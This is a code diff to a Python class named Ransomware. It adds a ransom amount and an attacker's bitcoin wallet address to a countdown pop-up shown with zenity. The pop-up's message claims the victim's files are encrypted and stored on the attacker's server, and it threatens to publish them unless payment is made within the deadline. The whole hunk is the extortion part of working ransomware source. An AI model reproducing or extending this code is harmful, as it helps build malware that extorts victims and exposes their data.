@@ -236,14 +236,20 @@ class Ransomware:
         start_time = time.time()
         remaining_time = 86400
 
+        bitcoin_needed = 0.001 #TODO: Assign this based on number of files
+        wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
+
         while remaining_time > 0:
             # Format the remaining time as hours, minutes and seconds
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
             seconds = int(remaining_time % 60)
 
+            
+
+
             # Text to be displayed on the pop up
-            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: xxx btc to wallet_id"
+            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: {bitcoin_needed} btc to {wallet_address}"
 
             # Show the dialog with the remaining time, keep refreshing the window.
             popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
